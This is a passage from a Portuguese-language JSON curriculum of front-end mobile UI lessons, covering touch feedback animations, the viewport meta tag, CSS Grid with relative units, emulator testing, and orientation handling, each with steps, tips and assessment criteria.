                                    "Analise exemplos reais de feedback visual em apps como Material Design (ripple) e iOS Human Interface Guidelines.",
                                    "Identifique princípios chave: imediatismo (dentro de 100ms), suavidade (60fps), relevância ao gesto e acessibilidade.",
                                    "Desenhe wireframes simples para um botão com ripple em tap e um slider com indicador de swipe.",
                                    "Pesquise transições CSS (transform, opacity) e eventos JS (touchstart, touchend)."
                                  ],
                                  "verification": "Criar um documento ou sketch com 3 exemplos de feedback visual anotados e princípios listados.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Navegador web, papel/caneta ou Figma para sketches, documentação MDN Web Docs para eventos touch.",
                                  "tips": "Priorize feedback que imite interações físicas para intuitividade.",
                                  "learningObjective": "Compreender os fundamentos teóricos de feedback visual para melhorar usabilidade em interfaces touch.",
                                  "commonMistakes": "Ignorar latência de rede ou dispositivos lentos; assumir desktop behaviors funcionam em mobile."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar ripple effect para gestos de tap",
                                  "subSteps": [
                                    "Crie um elemento HTML (ex: <button class='ripple-btn'>) com estilos base CSS.",
                                    "Adicione event listeners JS para touchstart: capture posição do toque (clientX, clientY).",
                                    "Gere dinamicamente um span de ripple no ponto de toque com CSS radial-gradient e scale/translate.",
                                    "Anime com CSS @keyframes: opacity de 1 a 0, scale de 0 a 1.5, duration 600ms.",
                                    "Remova o elemento ripple após animação com requestAnimationFrame para performance."
                                  ],
                                  "verification": "Testar em devtools mobile: tap deve criar círculo expansivo que some suavemente sem lags.",
                                  "estimatedTime": "1 hora",
                                  "materials": "Editor de código (VS Code), navegador com devtools mobile (Chrome), arquivos HTML/CSS/JS básicos.",
                                  "tips": "Use pointer-events: none no ripple para não interferir em eventos filhos.",
                                  "learningObjective": "Dominar criação de animações CSS/JS responsivas para feedback tátil imediato.",
                                  "commonMistakes": "Não calcular posição relativa corretamente; animações muito longas que sobrepõem taps rápidos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver indicadores visuais para gestos de swipe",
                                  "subSteps": [
                                    "Estruture um container swipeable (ex: carrossel com itens laterais ocultos via overflow: hidden).",
                                    "Capture touchmove: calcule deltaX = currentX - startX para direção e distância.",
                                    "Atualize transform: translateX baseado em deltaX com easing CSS (ease-out).",
                                    "Adicione indicador visual: barra de progresso ou glow/shadow que escala com progresso do swipe.",
                                    "No touchend, snap para posição mais próxima com velocity check para momentum."
                                  ],
                                  "verification": "Swipe deve mostrar indicador suave que segue o dedo e snaps corretamente ao soltar.",
                                  "estimatedTime": "1 hora 15 minutos",
                                  "materials": "Mesmo setup do step 2, adicione biblioteca opcional como Tiny-Swiper para inspiração (mas implemente vanilla).",
                                  "tips": "Debounce eventos touchmove com throttle para evitar excesso de repaints.",
                                  "learningObjective": "Implementar tracking de gestos contínuos com feedback proporcional à intensidade.",
                                  "commonMistakes": "Permitir swipes verticais interferirem (use preventDefault seletivo); ignorar touch cancel events."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, otimizar e integrar feedback em interface móvel",
                                  "subSteps": [
                                    "Teste em emulador e dispositivo real: verifique FPS com devtools Performance tab.",
                                    "Otimize: use will-change: transform; GPU acceleration; reduza reflows com absolute positioning.",
                                    "Integre acessibilidade: adicione ARIA-live para screen readers e keyboard fallbacks.",
                                    "Refine com user testing simulado: ajuste durations e intensidades baseadas em feel.",
                                    "Documente código com comentários e crie demo responsiva para diferentes tamanhos de tela."
                                  ],
                                  "verification": "Gravação de tela mostra feedback fluido em 3 gestos diferentes sem quedas de FPS abaixo de 50.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Dispositivo móvel Android/iOS, Lighthouse para performance/Accessibility audit, Git para versionamento.",
                                  "tips": "Sempre teste em low-end devices; use reduced motion media query para usuários sensíveis.",
                                  "learningObjective": "Garantir feedback visual robusto, performático e inclusivo em cenários reais.",
                                  "commonMistakes": "Esquecer passive: true em touch listeners causando scroll lags; não testar landscape/portrait."
                                }
                              ],
                              "practicalExample": "Em um app de galeria de fotos mobile, implemente ripple azul no tap para like em fotos e uma barra de glow inferior que se expande durante swipe para próxima imagem, confirmando o gesto com um fade-in suave da nova foto.",
                              "finalVerifications": [
                                "Ripple inicia no exato ponto de toque e expande uniformemente em <100ms.",
                                "Indicador de swipe responde proporcionalmente à distância e direção do dedo.",
                                "Animações mantêm 60fps em dispositivos mid-range durante gestos rápidos.",
                                "Feedback funciona em touch e mouse para desktop testing.",
                                "Nenhum conflito com scroll nativo ou outros gestos.",
                                "Acessível via keyboard e screen readers anuncia mudanças."
                              ],
                              "assessmentCriteria": [
                                "Precisão e imediatismo do feedback (nota 1-5 por latência <100ms).",
                                "Suavidade visual e performance (FPS >50, sem jank).",
                                "Responsividade cross-device (mobile/desktop, portrait/landscape).",
                                "Código limpo, comentado e modular (reutilizável).",
                                "Integração com acessibilidade e edge cases handled.",
                                "Criatividade na aplicação realista ao contexto UI/UX."
                              ],
                              "crossCurricularConnections": [
                                "Design Gráfico: Uso de gradientes e motion design para estética.",
                                "Psicologia Cognitiva: Princípios de affordance e feedback sensorial humano.",
                                "Desenvolvimento Web Avançado: Otimização de performance com requestAnimationFrame.",
                                "Acessibilidade Digital: WCAG 2.1 para motion e touch targets."
                              ],
                              "realWorldApplication": "Em apps como Instagram (swipe stories com glow progressivo) ou Google Material Design (ripple em todos os taps), melhorando retenção de usuários em 20-30% via UX intuitiva e reduzindo erros de interação em interfaces touch."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.5.2.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.5.3",
                        "name": "Adaptação a Diferentes Tamanhos de Tela",
                        "description": "Técnicas para otimizar interfaces para variados tamanhos e orientações de tela em dispositivos móveis, incluindo smartphones e tablets.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.5.3.1",
                            "name": "Configurar viewport meta tag",
                            "description": "Implementar a tag <meta name='viewport'> corretamente para controlar zoom e escala inicial em diferentes dispositivos móveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito de Viewport Meta Tag",
                                  "subSteps": [
                                    "Pesquise o que é o viewport em navegadores móveis e como ele difere do desktop.",
                                    "Identifique problemas comuns sem a tag, como zoom automático excessivo e layout fixo em pixels.",
                                    "Estude os atributos principais: width, initial-scale, maximum-scale e user-scalable.",
                                    "Analise exemplos de sites que falham em mobile devido à ausência da tag.",
                                    "Compare viewport com media queries em CSS."
                                  ],
                                  "verification": "Explique em suas palavras o propósito da viewport meta tag e liste 3 problemas resolvidos por ela.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Documentação MDN Web Docs sobre Viewport Meta Tag",
                                    "Vídeo tutorial no YouTube sobre responsividade mobile (5-10 min)",
                                    "Navegador com DevTools (modo mobile)"
                                  ],
                                  "tips": [
                                    "Use o DevTools do Chrome (F12 > Toggle device toolbar) para simular mobile imediatamente.",
                                    "Anote diferenças entre viewport lógico e físico."
                                  ],
                                  "learningObjective": "Entender o papel fundamental da viewport meta tag na adaptação mobile.",
                                  "commonMistakes": [
                                    "Confundir viewport com canvas ou outras tags meta.",
                                    "Ignorar que sem ela, width padrão é 980px em mobile."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Aprender a Sintaxe Correta da Tag",
                                  "subSteps": [
                                    "Memorize a estrutura básica: <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">.",
                                    "Experimente variações: adicione user-scalable=no para apps nativos ou maximum-scale=1.0.",
                                    "Teste content inválido no DevTools para ver erros de parsing.",
                                    "Estude recomendações do Google para Mobile Web (width=device-width sempre).",
                                    "Crie uma tabela com 5 atributos comuns e seus valores ideais."
                                  ],
                                  "verification": "Escreva 3 variações corretas da tag para cenários diferentes (padrão, no zoom, app híbrido).",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto como VS Code",
                                    "Referência W3C Mobile Web Best Practices",
                                    "HTML boilerplate template"
                                  ],
                                  "tips": [
                                    "Sempre use aspas duplas no name e content para compatibilidade.",
                                    "Evite initial-scale=0; use 1.0 para escala natural."
                                  ],
                                  "learningObjective": "Dominar a sintaxe precisa e variações da tag viewport.",
                                  "commonMistakes": [
                                    "Escrever name='viewport' sem aspas ou com vírgulas erradas no content.",
                                    "Colocar a tag fora do <head>."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar a Tag no Cabeçalho HTML",
                                  "subSteps": [
                                    "Crie um arquivo HTML simples com <head> vazio.",
                                    "Insira a tag viewport logo após <title> no <head>.",
                                    "Adicione CSS básico com larguras em % ou vw para testar responsividade.",
                                    "Valide o HTML usando o W3C Validator.",
                                    "Integre com um framework como Bootstrap se disponível."
                                  ],
                                  "verification": "Abra o arquivo em um emulador mobile e confirme que não há zoom inicial automático.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Editor HTML (VS Code ou CodePen)",
                                    "Servidor local (Live Server extension)",
                                    "HTML5 boilerplate"
                                  ],
                                  "tips": [
                                    "Coloque a tag como a primeira meta tag após <title> para prioridade.",
                                    "Use <!DOCTYPE html> para modo standards."
                                  ],
                                  "learningObjective": "Implementar corretamente a tag em um documento HTML real.",
                                  "commonMistakes": [
                                    "Duplicar a tag ou colocá-la no <body>.",
                                    "Esquecer vírgula entre atributos no content."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Otimizar a Configuração",
                                  "subSteps": [
                                    "Teste em múltiplos dispositivos/emuladores (iPhone, Android, tablets).",
                                    "Use Lighthouse no Chrome DevTools para auditoria de mobile.",
                                    "Ajuste atributos baseados em feedback (ex: desabilitar zoom em PWAs).",
                                    "Compare before/after com screenshots.",
                                    "Documente otimizações para diferentes contextos (e-commerce vs blog)."
                                  ],
                                  "verification": "Gere relatório do Lighthouse mostrando pontuação mobile >90 sem erros de viewport.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Chrome DevTools (Device Mode + Lighthouse)",
                                    "Ferramentas online como Responsinator ou Mobile-Friendly Test do Google",
                                    "Dispositivos reais ou BrowserStack"
                                  ],
                                  "tips": [
                                    "Teste em portrait e landscape.",
                                    "Monitore performance; viewport afeta renderização inicial."
                                  ],
                                  "learningObjective": "Validar e refinar a implementação para produção.",
                                  "commonMistakes": [
                                    "Testar só em desktop DevTools sem simular touch/zoom.",
                                    "Ignorar variações de SO (iOS vs Android)."
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um site de e-commerce simples: adicione <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> no <head>. Inclua CSS com .container { max-width: 100%; }. Teste em mobile: o layout deve se ajustar sem zoom forçado, permitindo navegação suave em produtos.",
                              "finalVerifications": [
                                "A página carrega em escala 1:1 em qualquer mobile sem zoom automático.",
                                "Elementos como botões e textos são legíveis sem pinch-zoom inicial.",
                                "Lighthouse Mobile audit passa em 'Viewport' e 'Tap Targets'.",
                                "Nenhum erro de parsing da meta tag no console do navegador.",
                                "Layout responsivo funciona com media queries ativadas corretamente.",
                                "Teste em 3 dispositivos diferentes confirma consistência."
                              ],
                              "assessmentCriteria": [
                                "Tag implementada com sintaxe 100% correta no <head>.",
                                "Atributos essenciais (width=device-width, initial-scale=1.0) presentes.",
                                "Testes comprovam adaptação sem problemas de escala/zoom.",
                                "Documentação de testes e otimizações fornecida.",
                                "Integração com CSS responsivo demonstrada.",
                                "Ausência de erros comuns identificados nos steps."
                              ],
                              "crossCurricularConnections": [
                                "Design Responsivo (CSS Media Queries e Flexbox)",
                                "UX/UI para Mobile (Princípios de Touch Targets e Legibilidade)",
                                "Desenvolvimento Web Full-Stack (Integração com Frameworks como React/Vue)",
                                "Acessibilidade Web (WCAG 2.1 para zoom e escala)",
                                "Otimização de Performance (Core Web Vitals - Largest Contentful Paint)"
                              ],
                              "realWorldApplication": "Em sites como Amazon ou Netflix mobile, a viewport meta tag garante que usuários vejam o conteúdo otimizado imediatamente em smartphones, reduzindo bounce rate em 20-30% e melhorando SEO mobile, essencial para 60%+ do tráfego web global."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.5.3.2",
                            "name": "Usar unidades relativas e CSS Grid",
                            "description": "Aplicar unidades como vw, vh, em e rem, combinadas com CSS Grid para layouts que se adaptam proporcionalmente a qualquer tamanho de tela.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender e praticar unidades relativas (vw, vh, em, rem)",
                                  "subSteps": [
                                    "Pesquise definições: vw (1% da largura da viewport), vh (1% da altura da viewport), em (relativo ao tamanho da fonte do elemento pai), rem (relativo à fonte raiz do html).",
                                    "Crie um HTML simples com divs e aplique cada unidade em propriedades como width, height, font-size e padding.",
                                    "Teste redimensionando a janela do navegador para observar adaptações proporcionais.",
                                    "Compare com unidades fixas (px) em um side-by-side para visualizar diferenças.",
                                    "Ajuste valores em diferentes breakpoints usando media queries."
                                  ],
                                  "verification": "O layout muda proporcionalmente ao redimensionar a viewport sem quebrar; use DevTools para inspecionar valores computados.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Editor de código (VS Code)",
                                    "Navegador com DevTools (Chrome)",
                                    "Documentação MDN: CSS Units"
                                  ],
                                  "tips": "Comece com vw/vh para dimensões da tela e em/rem para tipografia hierárquica.",
                                  "learningObjective": "Dominar como unidades relativas criam escalabilidade proporcional em layouts.",
                                  "commonMistakes": [
                                    "Confundir em (herdado do pai) com rem (raiz); usar vw em textos longos sem limite de quebra."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dominar os fundamentos do CSS Grid",
                                  "subSteps": [
                                    "Defina um container com display: grid e configure grid-template-columns/rows com repeat() e fr units.",
                                    "Posicione itens com grid-column e grid-row para criar uma grade explícita.",
                                    "Aplique grid-gap (ou gap) e alinhe itens com justify-items/align-items.",
                                    "Crie um layout básico de 12 colunas responsivo com auto-fit e minmax().",
                                    "Teste colapso de colunas em telas pequenas."
                                  ],
                                  "verification": "Itens se posicionam corretamente na grade sem overflow; inspecione grid lines no DevTools Grid Inspector.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "VS Code",
                                    "Chrome DevTools Grid Overlay",
                                    "CSS Grid Generator online (opcional)"
                                  ],
                                  "tips": "Use fr para flexibilidade e minmax para responsividade mínima/máxima.",
                                  "learningObjective": "Construir grades bidimensionais flexíveis para layouts complexos.",
                                  "commonMistakes": [
                                    "Esquecer display: grid no container; usar grid-template-columns fixo sem media queries."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar unidades relativas com CSS Grid",
                                  "subSteps": [
                                    "No container grid, defina grid-template-columns com valores em vw ou rem, como repeat(3, 1fr) mas com minmax(20vw, 1fr).",
                                    "Aplique vh para altura de rows em layouts full-height, como grid-template-rows: 10vh 1fr 5vh.",
                                    "Use rem/em em grid-gap e paddings dos itens para tipografia responsiva.",
                                    "Crie spans dinâmicos: grid-column: span 2 em telas médias.",
                                    "Adicione media queries para alternar entre grid mobile (1 coluna) e desktop (múltiplas com vw)."
                                  ],
                                  "verification": "Grade adapta-se a qualquer tamanho de tela mantendo proporções; teste em emulador de dispositivos.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "VS Code",
                                    "Responsinator ou Chrome DevTools Device Mode"
                                  ],
                                  "tips": "Combine vw para largura global e rem para espaçamentos locais para hierarquia consistente.",
                                  "learningObjective": "Criar layouts proporcionais usando unidades relativas dentro de Grid.",
                                  "commonMistakes": [
                                    "Aplicar vw em grid-gap causando gaps excessivos em telas grandes; ignorar root font-size para rem."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Construir, testar e otimizar um layout responsivo completo",
                                  "subSteps": [
                                    "Crie um card grid para um dashboard: header (10vh), sidebar (20vw), main content (1fr com rem paddings).",
                                    "Implemente hover effects e transições suaves com units relativas.",
                                    "Teste em múltiplos dispositivos: mobile (stack vertical), tablet (2 colunas), desktop (3+).",
                                    "Otimize performance com will-change e reduza reflows.",
                                    "Valide acessibilidade com screen readers e zoom 200%."
                                  ],
                                  "verification": "Layout funciona perfeitamente em 5+ tamanhos de tela sem scroll horizontal ou quebras.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "VS Code",
                                    "Chrome Lighthouse para performance/acessibilidade",
                                    "BrowserStack para cross-device"
                                  ],
                                  "tips": "Defina font-size: 16px no :root para baseline rem consistente.",
                                  "learningObjective": "Aplicar conhecimentos em um projeto realista e iterar com testes.",
                                  "commonMistakes": [
                                    "Não resetar box-sizing: border-box; esquecer fallbacks para browsers antigos."
                                  ]
                                }
                              ],
                              "practicalExample": "Crie um dashboard de e-commerce responsivo: header fixo em 8vh com logo em 2rem, grid principal com sidebar (25vw em desktop, 100vw em mobile), cards de produtos em grid de 1fr com gap 1rem e imagens em 100% com object-fit: cover.",
                              "finalVerifications": [
                                "Layout adapta-se perfeitamente de 320px a 1920px sem quebras.",
                                "Unidades relativas computadas corretamente no DevTools em diferentes viewports.",
                                "Grid lines visíveis e itens posicionados sem overlaps.",
                                "Performance Lighthouse >90 em mobile para responsividade.",
                                "Zoom e rotação de tela mantêm proporções.",
                                "Acessível com keyboard navigation e ARIA labels."
                              ],
                              "assessmentCriteria": [
                                "Precisão no uso de vw/vh para dimensões viewport e em/rem para texto/espaço (90% correto).",
                                "Grid responsivo com minmax/auto-fit funcionando em 3+ breakpoints.",
                                "Código limpo, sem units fixas desnecessárias e com comentários.",
                                "Tempo de carregamento otimizado e sem erros console.",
                                "Criatividade na aplicação realista além do básico.",
                                "Documentação de testes em README."
                              ],
                              "crossCurricularConnections": [
                                "Design Gráfico: Proporções áureas com rem/em para UI harmoniosa.",
                                "Matemática: Cálculos proporcionais e porcentagens em layouts.",
                                "Acessibilidade e Inclusão: Unidades fluidas para usuários com baixa visão.",
                                "Desenvolvimento Mobile: Integração com frameworks como React Native Web.",
                                "Gestão de Projetos: Planejamento de breakpoints escaláveis."
                              ],
                              "realWorldApplication": "Desenvolvimento de sites e apps mobile-first como portais de notícias (ex: CNN.com usa Grid + vw para feeds adaptáveis), dashboards admin (ex: Google Analytics responsivo) e e-commerces (ex: Shopify themes com layouts proporcionais em qualquer dispositivo)."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.5.3.1"
                            ]
                          },
                          {
                            "id": "10.1.2.5.3.3",
                            "name": "Testar responsividade em emuladores",
                            "description": "Utilizar ferramentas como Chrome DevTools, BrowserStack ou emuladores Android/iOS para testar e depurar adaptações em múltiplos tamanhos de tela.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de emulação e ferramentas",
                                  "subSteps": [
                                    "Instale e abra o Chrome DevTools (pressione F12 ou Ctrl+Shift+I).",
                                    "Configure emuladores Android via Android Studio ou iOS Simulator no Xcode.",
                                    "Crie conta gratuita no BrowserStack e acesse a biblioteca de dispositivos reais.",
                                    "Prepare seu projeto web/app local abrindo-o em um servidor local (ex: Live Server no VS Code).",
                                    "Teste a conexão básica abrindo o projeto em uma aba do Chrome."
                                  ],
                                  "verification": "Ferramentas de emulação estão abertas e o projeto carrega corretamente em pelo menos um emulador sem erros de rede.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Chrome browser",
                                    "Android Studio ou Xcode",
                                    "BrowserStack (conta gratuita)",
                                    "VS Code com Live Server extension"
                                  ],
                                  "tips": "Use atalhos como Ctrl+Shift+M no Chrome para togglear Device Mode rapidamente.",
                                  "learningObjective": "Dominar a configuração inicial de múltiplas ferramentas de emulação para testes cross-device.",
                                  "commonMistakes": [
                                    "Esquecer de rodar servidor local, causando erros CORS.",
                                    "Não atualizar drivers USB para emuladores físicos.",
                                    "Ignorar configurações de rede no emulador."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Simular diferentes tamanhos e orientações de tela",
                                  "subSteps": [
                                    "No Chrome DevTools, selecione Device Toolbar e escolha presets como iPhone SE, Galaxy S20 ou custom dimensions (320x480 a 1920x1080).",
                                    "No Android Emulator, altere configurações de dispositivo para tablets e phones variados, rotacione tela (Ctrl+F11).",
                                    "Use BrowserStack para selecionar 5+ dispositivos reais (ex: iOS 15 iPhone 12, Android 11 Pixel 5).",
                                    "Teste zoom, scroll e gestos touch em cada simulação.",
                                    "Registre screenshots iniciais de cada viewport para baseline."
                                  ],
                                  "verification": "Pelo menos 6 diferentes tamanhos/orientations foram simulados e screenshots salvos sem crashes.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Chrome DevTools Device Mode",
                                    "Android Emulator",
                                    "BrowserStack Live",
                                    "Ferramenta de screenshot como Snipping Tool"
                                  ],
                                  "tips": "Priorize os top 80% de dispositivos usados via estatísticas do BrowserStack para eficiência.",
                                  "learningObjective": "Habilitar testes abrangentes em viewports variados simulando cenários reais de usuários.",
                                  "commonMistakes": [
                                    "Testar apenas landscape ou portrait único.",
                                    "Ignorar densidades de pixel (DPI) em emuladores.",
                                    "Não simular conexões lentas (throttling no DevTools)."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar testes de responsividade e identificar falhas",
                                  "subSteps": [
                                    "Inspecione elementos com DevTools Toggle Device para checar media queries e flex/grid behaviors.",
                                    "Verifique layout shifts, overflow, text readability e touch targets (mín. 44x44px).",
                                    "Use Lighthouse no DevTools para rodar audit de Performance e Accessibility em mobile.",
                                    "No emulador, interaja com elementos (tap, swipe) e note bugs como botões não clicáveis.",
                                    "Compile uma lista de issues em uma tabela (viewport, problema, screenshot)."
                                  ],
                                  "verification": "Lista de pelo menos 3-5 issues identificados com evidências (screenshots e descrições).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Chrome DevTools Inspector/Lighthouse",
                                    "Emuladores Android/iOS",
                                    "Planilha Google Sheets ou Notion para tracking"
                                  ],
                                  "tips": "Ative 'Emulate CSS media' no DevTools para forçar condições específicas como prefers-reduced-motion.",
                                  "learningObjective": "Desenvolver skills para detectar falhas de UI/UX em contextos mobile variados.",
                                  "commonMistakes": [
                                    "Focar só em visual; ignorar performance ou accessibility.",
                                    "Não testar interações touch.",
                                    "Confundir issues de layout com problemas de JavaScript."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Depurar, corrigir e validar as adaptações",
                                  "subSteps": [
                                    "Aplique fixes no código (ex: ajustar breakpoints CSS, usar viewport units).",
                                    "Re-teste nos mesmos emuladores para confirmar resoluções.",
                                    "Rode Lighthouse novamente e compare scores antes/depois.",
                                    "Teste em pelo menos 2 dispositivos adicionais não testados antes.",
                                    "Documente mudanças em um changelog e exporte relatório final."
                                  ],
                                  "verification": "Todos issues resolvidos, Lighthouse score >80 em mobile, e relatório salvo.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Editor de código (VS Code)",
                                    "DevTools Sources para debugging",
                                    "BrowserStack para validação cross-browser"
                                  ],
                                  "tips": "Use breakpoints condicionais no CSS para debugar media queries específicas.",
                                  "learningObjective": "Capacitar iterações rápidas de debug e validação para UIs responsivas robustas.",
                                  "commonMistakes": [
                                    "Não re-testar em todos viewports após fixes.",
                                    "Overfitting para um dispositivo único.",
                                    "Esquecer de commit changes no Git."
                                  ]
                                }
                              ],
                              "practicalExample": "Ao desenvolver um e-commerce mobile-first, use Chrome DevTools para simular iPhone 14 em portrait (390x844), identifique botão de carrinho overflow em telas pequenas, corrija com media query @media (max-width: 400px), valide no Android Emulator Galaxy Fold e BrowserStack Safari iPad, elevando Lighthouse de 65 para 92.",
                              "finalVerifications": [
                                "Projeto passa sem erros visuais ou funcionais em 8+ viewports simulados.",
                                "Lighthouse Mobile score ≥85 em Performance, Accessibility e Best Practices.",
                                "Relatório com screenshots before/after e lista de fixes documentada.",
                                "Interações touch funcionam perfeitamente em emuladores Android/iOS.",
                                "Nenhum layout shift (CLS <0.1) detectado via DevTools.",
                                "Validação cross-browser em BrowserStack para 3 SOs diferentes."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração e uso de múltiplas ferramentas (DevTools, emuladores, BrowserStack).",
                                "Abrangência de testes: cobertura de 80%+ dos tamanhos de tela comuns.",
                                "Qualidade da identificação de issues: pelo menos 5 bugs únicos detectados e priorizados.",
                                "Eficácia das correções: todas issues resolvidas com código limpo e comentado.",
                                "Documentação completa: relatório com evidências e métricas quantitativas.",
                                "Eficiência temporal: conclusão dentro de 1.5h com otimizações aplicadas."
                              ],
                              "crossCurricularConnections": [
                                "Design Gráfico: Aplicação de princípios de grid systems e proporções áureas em layouts responsivos.",
                                "Programação: Integração de CSS Flexbox/Grid e JavaScript para dynamic viewports.",
                                "Matemática: Cálculos de escalas, proporções e unidades relativas (vw, vh, rem).",
                                "Gestão de Projetos: Uso de ferramentas de tracking de bugs como Jira para issues mobile.",
                                "Acessibilidade: Conformidade com WCAG 2.1 para touch targets e reduced motion."
                              ],
                              "realWorldApplication": "Desenvolvedores front-end usam isso diariamente para garantir que apps como Instagram ou apps bancários funcionem perfeitamente em qualquer smartphone, reduzindo churn de usuários mobile (60%+ do tráfego web) e evitando custos de retrabalho pós-lançamento."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.5.1.3",
                              "10.1.2.5.3.2"
                            ]
                          },
                          {
                            "id": "10.1.2.5.3.4",
                            "name": "Lidar com orientações portrait e landscape",
                            "description": "Desenvolver CSS e lógica JS para alternar layouts entre modos portrait e landscape, otimizando botões e conteúdo para cada orientação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Media Queries CSS para Portrait e Landscape",
                                  "subSteps": [
                                    "Crie uma estrutura HTML básica com elementos como header, conteúdo principal e botões.",
                                    "No CSS, defina estilos base usando viewport units (vh, vw).",
                                    "Adicione @media (orientation: portrait) { /* estilos para portrait: menu vertical, conteúdo em coluna */ }.",
                                    "Adicione @media (orientation: landscape) { /* estilos para landscape: menu horizontal, conteúdo expandido */ }.",
                                    "Ajuste tamanhos de fonte, margens e padding para cada orientação."
                                  ],
                                  "verification": "Abra DevTools no navegador (Ctrl+Shift+I), ative modo dispositivo e alterne orientação; confirme mudanças visuais sem JS.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Editor de código (VS Code)",
                                    "Navegador com DevTools (Chrome)",
                                    "HTML/CSS boilerplate"
                                  ],
                                  "tips": "Combine com min-width/max-width para telas variadas; use flexbox ou grid para layouts flexíveis.",
                                  "learningObjective": "Implementar CSS responsivo baseado em orientação sem dependência de JavaScript.",
                                  "commonMistakes": [
                                    "Esquecer 'orientation' no media query",
                                    "Usar px fixos em vez de unidades relativas",
                                    "Não testar em resoluções baixas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Detecção de Orientação com JavaScript",
                                  "subSteps": [
                                    "Adicione um script JS ao HTML.",
                                    "Use window.matchMedia('(orientation: portrait)') para detectar orientação atual.",
                                    "Crie uma função detectOrientation() que verifica e aplica classe 'portrait' ou 'landscape' ao body.",
                                    "Registre o evento 'orientationchange' e 'resize' no window para chamadas dinâmicas.",
                                    "Adicione window.orientation para suporte legado em alguns dispositivos."
                                  ],
                                  "verification": "Console.log a orientação atual; rotacione o dispositivo/emulador e veja logs atualizados.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Editor de código",
                                    "Navegador DevTools",
                                    "Emulador mobile (Chrome DevTools ou Android Studio)"
                                  ],
                                  "tips": "Debounce o evento resize para evitar chamadas excessivas; teste em modo avião para simular mobile real.",
                                  "learningObjective": "Detectar mudanças de orientação em tempo real usando eventos JS nativos.",
                                  "commonMistakes": [
                                    "Não remover event listeners duplicados",
                                    "Ignorar suporte a iOS vs Android",
                                    "Usar apenas window.orientation sem matchMedia"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Alternar Layouts Dinamicamente com Lógica JS e Classes CSS",
                                  "subSteps": [
                                    "Defina classes CSS .portrait e .landscape com overrides nos media queries.",
                                    "Na função detectOrientation(), adicione/remove classes do document.body baseado na orientação.",
                                    "Implemente transições suaves com CSS transition: all 0.3s ease.",
                                    "Ajuste visibilidade de elementos, como esconder sidebar em portrait.",
                                    "Teste a alternância manual chamando a função via console."
                                  ],
                                  "verification": "Rotacione o emulador; layout deve mudar suavemente com classes corretas no body (inspecione elemento).",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Editor de código",
                                    "DevTools com emulador",
                                    "Exemplo HTML/CSS/JS pronto do step anterior"
                                  ],
                                  "tips": "Use classList.add/remove em vez de className para eficiência; priorize CSS para estados iniciais.",
                                  "learningObjective": "Integrar JS com CSS classes para layouts dinâmicos e performáticos.",
                                  "commonMistakes": [
                                    "Aplicar estilos inline via JS (ruim para performance)",
                                    "Não sincronizar JS com CSS media queries",
                                    "Transições longas que causam lag"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Otimizar Botões e Conteúdo para Cada Orientação",
                                  "subSteps": [
                                    "Identifique botões e conteúdo (ex: forms, imagens, textos).",
                                    "Em portrait: aumente tamanho de botões para touch (min 44px), stack vertical.",
                                    "Em landscape: compacte botões horizontalmente, expanda imagens/conteúdo.",
                                    "Use JS para reajustar alturas dinâmicas (ex: conteúdo height: calc(100vh - header).",
                                    "Adicione media queries específicas para botões (ex: button { padding: 2vw; })."
                                  ],
                                  "verification": "Toque/click em botões em ambas orientações; confirme sem overflow e tamanhos touch-friendly.",
